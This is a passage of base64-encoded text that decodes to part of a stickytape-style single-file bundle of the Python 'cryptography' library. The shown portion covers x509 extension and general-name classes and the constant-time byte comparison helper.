0cmlidXRlX2NlcnRzXHJcbiAgICAgICAgc2VsZi5fb25seV9zb21lX3JlYXNvbnMgPSBvbmx5X3NvbWVfcmVhc29uc1xyXG4gICAgICAgIHNlbGYuX2Z1bGxfbmFtZSA9IGZ1bGxfbmFtZVxyXG4gICAgICAgIHNlbGYuX3JlbGF0aXZlX25hbWUgPSByZWxhdGl2ZV9uYW1lXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICAiPElzc3VpbmdEaXN0cmlidXRpb25Qb2ludChmdWxsX25hbWU9ezAuZnVsbF9uYW1lfSwgIlxyXG4gICAgICAgICAgICAicmVsYXRpdmVfbmFtZT17MC5yZWxhdGl2ZV9uYW1lfSwgIlxyXG4gICAgICAgICAgICAib25seV9jb250YWluc191c2VyX2NlcnRzPXswLm9ubHlfY29udGFpbnNfdXNlcl9jZXJ0c30sICJcclxuICAgICAgICAgICAgIm9ubHlfY29udGFpbnNfY2FfY2VydHM9ezAub25seV9jb250YWluc19jYV9jZXJ0c30sICJcclxuICAgICAgICAgICAgIm9ubHlfc29tZV9yZWFzb25zPXswLm9ubHlfc29tZV9yZWFzb25zfSwgIlxyXG4gICAgICAgICAgICAiaW5kaXJlY3RfY3JsPXswLmluZGlyZWN0X2NybH0sICJcclxuICAgICAgICAgICAgIm9ubHlfY29udGFpbnNfYXR0cmlidXRlX2NlcnRzPSJcclxuICAgICAgICAgICAgInswLm9ubHlfY29udGFpbnNfYXR0cmlidXRlX2NlcnRzfSk+Ii5mb3JtYXQoc2VsZilcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBJc3N1aW5nRGlzdHJpYnV0aW9uUG9pbnQpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgc2VsZi5mdWxsX25hbWUgPT0gb3RoZXIuZnVsbF9uYW1lXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLnJlbGF0aXZlX25hbWUgPT0gb3RoZXIucmVsYXRpdmVfbmFtZVxyXG4gICAgICAgICAgICBhbmQgc2VsZi5vbmx5X2NvbnRhaW5zX3VzZXJfY2VydHMgPT0gb3RoZXIub25seV9jb250YWluc191c2VyX2NlcnRzXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLm9ubHlfY29udGFpbnNfY2FfY2VydHMgPT0gb3RoZXIub25seV9jb250YWluc19jYV9jZXJ0c1xyXG4gICAgICAgICAgICBhbmQgc2VsZi5vbmx5X3NvbWVfcmVhc29ucyA9PSBvdGhlci5vbmx5X3NvbWVfcmVhc29uc1xyXG4gICAgICAgICAgICBhbmQgc2VsZi5pbmRpcmVjdF9jcmwgPT0gb3RoZXIuaW5kaXJlY3RfY3JsXHJcbiAgICAgICAgICAgIGFuZCBzZWxmLm9ubHlfY29udGFpbnNfYXR0cmlidXRlX2NlcnRzXHJcbiAgICAgICAgICAgID09IG90aGVyLm9ubHlfY29udGFpbnNfYXR0cmlidXRlX2NlcnRzXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goXHJcbiAgICAgICAgICAgIChcclxuICAgICAgICAgICAgICAgIHNlbGYuZnVsbF9uYW1lLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5yZWxhdGl2ZV9uYW1lLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5vbmx5X2NvbnRhaW5zX3VzZXJfY2VydHMsXHJcbiAgICAgICAgICAgICAgICBzZWxmLm9ubHlfY29udGFpbnNfY2FfY2VydHMsXHJcbiAgICAgICAgICAgICAgICBzZWxmLm9ubHlfc29tZV9yZWFzb25zLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5pbmRpcmVjdF9jcmwsXHJcbiAgICAgICAgICAgICAgICBzZWxmLm9ubHlfY29udGFpbnNfYXR0cmlidXRlX2NlcnRzLFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGZ1bGxfbmFtZShzZWxmKSAtPiB0eXBpbmcuT3B0aW9uYWxbdHlwaW5nLkxpc3RbR2VuZXJhbE5hbWVdXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fZnVsbF9uYW1lXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcmVsYXRpdmVfbmFtZShzZWxmKSAtPiB0eXBpbmcuT3B0aW9uYWxbUmVsYXRpdmVEaXN0aW5ndWlzaGVkTmFtZV06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3JlbGF0aXZlX25hbWVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBvbmx5X2NvbnRhaW5zX3VzZXJfY2VydHMoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fb25seV9jb250YWluc191c2VyX2NlcnRzXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb25seV9jb250YWluc19jYV9jZXJ0cyhzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9vbmx5X2NvbnRhaW5zX2NhX2NlcnRzXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb25seV9zb21lX3JlYXNvbnMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICkgLT4gdHlwaW5nLk9wdGlvbmFsW3R5cGluZy5Gcm96ZW5TZXRbUmVhc29uRmxhZ3NdXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fb25seV9zb21lX3JlYXNvbnNcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBpbmRpcmVjdF9jcmwoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5faW5kaXJlY3RfY3JsXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb25seV9jb250YWluc19hdHRyaWJ1dGVfY2VydHMoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fb25seV9jb250YWluc19hdHRyaWJ1dGVfY2VydHNcclxuXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBydXN0X3g1MDkuZW5jb2RlX2V4dGVuc2lvbl92YWx1ZShzZWxmKVxyXG5cclxuXHJcbmNsYXNzIFVucmVjb2duaXplZEV4dGVuc2lvbihFeHRlbnNpb25UeXBlKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBvaWQ6IE9iamVjdElkZW50aWZpZXIsIHZhbHVlOiBieXRlcykgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvaWQsIE9iamVjdElkZW50aWZpZXIpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIm9pZCBtdXN0IGJlIGFuIE9iamVjdElkZW50aWZpZXIiKVxyXG4gICAgICAgIHNlbGYuX29pZCA9IG9pZFxyXG4gICAgICAgIHNlbGYuX3ZhbHVlID0gdmFsdWVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBvaWQoc2VsZikgLT4gT2JqZWN0SWRlbnRpZmllcjogICMgdHlwZTogaWdub3JlW292ZXJyaWRlXVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9vaWRcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiB2YWx1ZShzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gc2VsZi5fdmFsdWVcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgICI8VW5yZWNvZ25pemVkRXh0ZW5zaW9uKG9pZD17MC5vaWR9LCAiXHJcbiAgICAgICAgICAgICJ2YWx1ZT17MC52YWx1ZSFyfSk+Ii5mb3JtYXQoc2VsZilcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBVbnJlY29nbml6ZWRFeHRlbnNpb24pOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYub2lkID09IG90aGVyLm9pZCBhbmQgc2VsZi52YWx1ZSA9PSBvdGhlci52YWx1ZVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goKHNlbGYub2lkLCBzZWxmLnZhbHVlKSlcclxuXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBzZWxmLnZhbHVlXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkvaGF6bWF0L3ByaW1pdGl2ZXMvY29uc3RhbnRfdGltZS5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcblxyXG5pbXBvcnQgaG1hY1xyXG5cclxuXHJcbmRlZiBieXRlc19lcShhOiBieXRlcywgYjogYnl0ZXMpIC0+IGJvb2w6XHJcbiAgICBpZiBub3QgaXNpbnN0YW5jZShhLCBieXRlcykgb3Igbm90IGlzaW5zdGFuY2UoYiwgYnl0ZXMpOlxyXG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcigiYSBhbmQgYiBtdXN0IGJlIGJ5dGVzLiIpXHJcblxyXG4gICAgcmV0dXJuIGhtYWMuY29tcGFyZV9kaWdlc3QoYSwgYilcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS94NTA5L2dlbmVyYWxfbmFtZS5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcblxyXG5pbXBvcnQgYWJjXHJcbmltcG9ydCBpcGFkZHJlc3NcclxuaW1wb3J0IHR5cGluZ1xyXG5mcm9tIGVtYWlsLnV0aWxzIGltcG9ydCBwYXJzZWFkZHJcclxuXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lng1MDkubmFtZSBpbXBvcnQgTmFtZVxyXG5mcm9tIGNyeXB0b2dyYXBoeS54NTA5Lm9pZCBpbXBvcnQgT2JqZWN0SWRlbnRpZmllclxyXG5cclxuXHJcbl9JUEFERFJFU1NfVFlQRVMgPSB0eXBpbmcuVW5pb25bXHJcbiAgICBpcGFkZHJlc3MuSVB2NEFkZHJlc3MsXHJcbiAgICBpcGFkZHJlc3MuSVB2NkFkZHJlc3MsXHJcbiAgICBpcGFkZHJlc3MuSVB2NE5ldHdvcmssXHJcbiAgICBpcGFkZHJlc3MuSVB2Nk5ldHdvcmssXHJcbl1cclxuXHJcblxyXG5jbGFzcyBVbnN1cHBvcnRlZEdlbmVyYWxOYW1lVHlwZShFeGNlcHRpb24pOlxyXG4gICAgcGFzc1xyXG5cclxuXHJcbmNsYXNzIEdlbmVyYWxOYW1lKG1ldGFjbGFzcz1hYmMuQUJDTWV0YSk6XHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiB2YWx1ZShzZWxmKSAtPiB0eXBpbmcuQW55OlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybiB0aGUgdmFsdWUgb2YgdGhlIG9iamVjdFxyXG4gICAgICAgICIiIlxyXG5cclxuXHJcbmNsYXNzIFJGQzgyMk5hbWUoR2VuZXJhbE5hbWUpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHZhbHVlOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZSh2YWx1ZSwgc3RyKTpcclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgdmFsdWUuZW5jb2RlKCJhc2NpaSIpXHJcbiAgICAgICAgICAgIGV4Y2VwdCBVbmljb2RlRW5jb2RlRXJyb3I6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJSRkM4MjJOYW1lIHZhbHVlcyBzaG91bGQgYmUgcGFzc2VkIGFzIGFuIEEtbGFiZWwgc3RyaW5nLiAiXHJcbiAgICAgICAgICAgICAgICAgICAgIlRoaXMgbWVhbnMgdW5pY29kZSBjaGFyYWN0ZXJzIHNob3VsZCBiZSBlbmNvZGVkIHZpYSAiXHJcbiAgICAgICAgICAgICAgICAgICAgImEgbGlicmFyeSBsaWtlIGlkbmEuIlxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigidmFsdWUgbXVzdCBiZSBzdHJpbmciKVxyXG5cclxuICAgICAgICBuYW1lLCBhZGRyZXNzID0gcGFyc2VhZGRyKHZhbHVlKVxyXG4gICAgICAgIGlmIG5hbWUgb3Igbm90IGFkZHJlc3M6XHJcbiAgICAgICAgICAgICMgcGFyc2VhZGRyIGhhcyBmb3VuZCBhIG5hbWUgKGUuZy4gTmFtZSA8ZW1haWw+KSBvciB0aGUgZW50aXJlXHJcbiAgICAgICAgICAgICMgdmFsdWUgaXMgYW4gZW1wdHkgc3RyaW5nLlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJJbnZhbGlkIHJmYzgyMm5hbWUgdmFsdWUiKVxyXG5cclxuICAgICAgICBzZWxmLl92YWx1ZSA9IHZhbHVlXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgdmFsdWUoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl92YWx1ZVxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIF9pbml0X3dpdGhvdXRfdmFsaWRhdGlvbihjbHMsIHZhbHVlOiBzdHIpIC0+ICJSRkM4MjJOYW1lIjpcclxuICAgICAgICBpbnN0YW5jZSA9IGNscy5fX25ld19fKGNscylcclxuICAgICAgICBpbnN0YW5jZS5fdmFsdWUgPSB2YWx1ZVxyXG4gICAgICAgIHJldHVybiBpbnN0YW5jZVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8UkZDODIyTmFtZSh2YWx1ZT17MCFyfSk+Ii5mb3JtYXQoc2VsZi52YWx1ZSlcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIFJGQzgyMk5hbWUpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYudmFsdWUgPT0gb3RoZXIudmFsdWVcclxuXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBoYXNoKHNlbGYudmFsdWUpXHJcblxyXG5cclxuY2xhc3MgRE5TTmFtZShHZW5lcmFsTmFtZSk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgdmFsdWU6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBpc2luc3RhbmNlKHZhbHVlLCBzdHIpOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICB2YWx1ZS5lbmNvZGUoImFzY2lpIilcclxuICAgICAgICAgICAgZXhjZXB0IFVuaWNvZGVFbmNvZGVFcnJvcjpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgIkROU05hbWUgdmFsdWVzIHNob3VsZCBiZSBwYXNzZWQgYXMgYW4gQS1sYWJlbCBzdHJpbmcuICJcclxuICAgICAgICAgICAgICAgICAgICAiVGhpcyBtZWFucyB1bmljb2RlIGNoYXJhY3RlcnMgc2hvdWxkIGJlIGVuY29kZWQgdmlhICJcclxuICAgICAgICAgICAgICAgICAgICAiYSBsaWJyYXJ5IGxpa2UgaWRuYS4iXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJ2YWx1ZSBtdXN0IGJlIHN0cmluZyIpXHJcblxyXG4gICAgICAgIHNlbGYuX3ZhbHVlID0gdmFsdWVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiB2YWx1ZShzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3ZhbHVlXHJcblxyXG4gICAgQGNsYXNzbWV0aG9kXHJcbiAgICBkZWYgX2luaXRfd2l0aG91dF92YWxpZGF0aW9uKGNscywgdmFsdWU6IHN0cikgLT4gIkROU05hbWUiOlxyXG4gICAgICAgIGluc3RhbmNlID0gY2xzLl9fbmV3X18oY2xzKVxyXG4gICAgICAgIGluc3RhbmNlLl92YWx1ZSA9IHZhbHVlXHJcbiAgICAgICAgcmV0dXJuIGluc3RhbmNlXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gIjxETlNOYW1lKHZhbHVlPXswIXJ9KT4iLmZvcm1hdChzZWxmLnZhbHVlKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgRE5TTmFtZSk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi52YWx1ZSA9PSBvdGhlci52YWx1ZVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goc2VsZi52YWx1ZSlcclxuXHJcblxyXG5jbGFzcyBVbmlmb3JtUmVzb3VyY2VJZGVudGlmaWVyKEdlbmVyYWxOYW1lKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCB2YWx1ZTogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2UodmFsdWUsIHN0cik6XHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIHZhbHVlLmVuY29kZSgiYXNjaWkiKVxyXG4gICAgICAgICAgICBleGNlcHQgVW5pY29kZUVuY29kZUVycm9yOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiVVJJIHZhbHVlcyBzaG91bGQgYmUgcGFzc2VkIGFzIGFuIEEtbGFiZWwgc3RyaW5nLiAiXHJcbiAgICAgICAgICAgICAgICAgICAgIlRoaXMgbWVhbnMgdW5pY29kZSBjaGFyYWN0ZXJzIHNob3VsZCBiZSBlbmNvZGVkIHZpYSAiXHJcbiAgICAgICAgICAgICAgICAgICAgImEgbGlicmFyeSBsaWtlIGlkbmEuIlxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigidmFsdWUgbXVzdCBiZSBzdHJpbmciKVxyXG5cclxuICAgICAgICBzZWxmLl92YWx1ZSA9IHZhbHVlXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgdmFsdWUoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl92YWx1ZVxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIF9pbml0X3dpdGhvdXRfdmFsaWRhdGlvbihcclxuICAgICAgICBjbHMsIHZhbHVlOiBzdHJcclxuICAgICkgLT4gIlVuaWZvcm1SZXNvdXJjZUlkZW50aWZpZXIiOlxyXG4gICAgICAgIGluc3RhbmNlID0gY2xzLl9fbmV3X18oY2xzKVxyXG4gICAgICAgIGluc3RhbmNlLl92YWx1ZSA9IHZhbHVlXHJcbiAgICAgICAgcmV0dXJuIGluc3RhbmNlXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gIjxVbmlmb3JtUmVzb3VyY2VJZGVudGlmaWVyKHZhbHVlPXswIXJ9KT4iLmZvcm1hdChzZWxmLnZhbHVlKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgVW5pZm9ybVJlc291cmNlSWRlbnRpZmllcik6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi52YWx1ZSA9PSBvdGhlci52YWx1ZVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goc2VsZi52YWx1ZSlcclxuXHJcblxyXG5jbGFzcyBEaXJlY3RvcnlOYW1lKEdlbmVyYWxOYW1lKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCB2YWx1ZTogTmFtZSkgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZSh2YWx1ZSwgTmFtZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigidmFsdWUgbXVzdCBiZSBhIE5hbWUiKVxyXG5cclxuICAgICAgICBzZWxmLl92YWx1ZSA9IHZhbHVlXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgdmFsdWUoc2VsZikgLT4gTmFtZTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fdmFsdWVcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPERpcmVjdG9yeU5hbWUodmFsdWU9e30pPiIuZm9ybWF0KHNlbGYudmFsdWUpXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBEaXJlY3RvcnlOYW1lKTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLnZhbHVlID09IG90aGVyLnZhbHVlXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaChzZWxmLnZhbHVlKVxyXG5cclxuXHJcbmNsYXNzIFJlZ2lzdGVyZWRJRChHZW5lcmFsTmFtZSk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgdmFsdWU6IE9iamVjdElkZW50aWZpZXIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UodmFsdWUsIE9iamVjdElkZW50aWZpZXIpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoInZhbHVlIG11c3QgYmUgYW4gT2JqZWN0SWRlbnRpZmllciIpXHJcblxyXG4gICAgICAgIHNlbGYuX3ZhbHVlID0gdmFsdWVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiB2YWx1ZShzZWxmKSAtPiBPYmplY3RJZGVudGlmaWVyOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl92YWx1ZVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8UmVnaXN0ZXJlZElEKHZhbHVlPXt9KT4iLmZvcm1hdChzZWxmLnZhbHVlKVxyXG5cclxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvdGhlciwgUmVnaXN0ZXJlZElEKTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLnZhbHVlID09IG90aGVyLnZhbHVlXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaChzZWxmLnZhbHVlKVxyXG5cclxuXHJcbmNsYXNzIElQQWRkcmVzcyhHZW5lcmFsTmFtZSk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgdmFsdWU6IF9JUEFERFJFU1NfVFlQRVMpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoXHJcbiAgICAgICAgICAgIHZhbHVlLFxyXG4gICAgICAgICAgICAoXHJcbiAgICAgICAgICAgICAgICBpcGFkZHJlc3MuSVB2NEFkZHJlc3MsXHJcbiAgICAgICAgICAgICAgICBpcGFkZHJlc3MuSVB2NkFkZHJlc3MsXHJcbiAgICAgICAgICAgICAgICBpcGFkZHJlc3MuSVB2NE5ldHdvcmssXHJcbiAgICAgICAgICAgICAgICBpcGFkZHJlc3MuSVB2Nk5ldHdvcmssXHJcbiAgICAgICAgICAgICksXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgInZhbHVlIG11c3QgYmUgYW4gaW5zdGFuY2Ugb2YgaXBhZGRyZXNzLklQdjRBZGRyZXNzLCAiXHJcbiAgICAgICAgICAgICAgICAiaXBhZGRyZXNzLklQdjZBZGRyZXNzLCBpcGFkZHJlc3MuSVB2NE5ldHdvcmssIG9yICJcclxuICAgICAgICAgICAgICAgICJpcGFkZHJlc3MuSVB2Nk5ldHdvcmsiXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgc2VsZi5fdmFsdWUgPSB2YWx1ZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHZhbHVlKHNlbGYpIC0+IF9JUEFERFJFU1NfVFlQRVM6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3ZhbHVlXHJcblxyXG4gICAgZGVmIF9wYWNrZWQoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZShcclxuICAgICAgICAgICAgc2VsZi52YWx1ZSwgKGlwYWRkcmVzcy5JUHY0QWRkcmVzcywgaXBhZGRyZXNzLklQdjZBZGRyZXNzKVxyXG4gICAgICAgICk6XHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmLnZhbHVlLnBhY2tlZFxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJldHVybiAoXHJcbiAgICAgICAgICAgICAgICBzZWxmLnZhbHVlLm5ldHdvcmtfYWRkcmVzcy5wYWNrZWQgKyBzZWxmLnZhbHVlLm5ldG1hc2sucGFja2VkXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPElQQWRkcmVzcyh2YWx1ZT17fSk+Ii5mb3JtYXQoc2VsZi52YWx1ZSlcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIElQQWRkcmVzcyk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi52YWx1ZSA9PSBvdGhlci52YWx1ZVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goc2VsZi52YWx1ZSlcclxuXHJcblxyXG5jbGFzcyBPdGhlck5hbWUoR2VuZXJhbE5hbWUpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHR5cGVfaWQ6IE9iamVjdElkZW50aWZpZXIsIHZ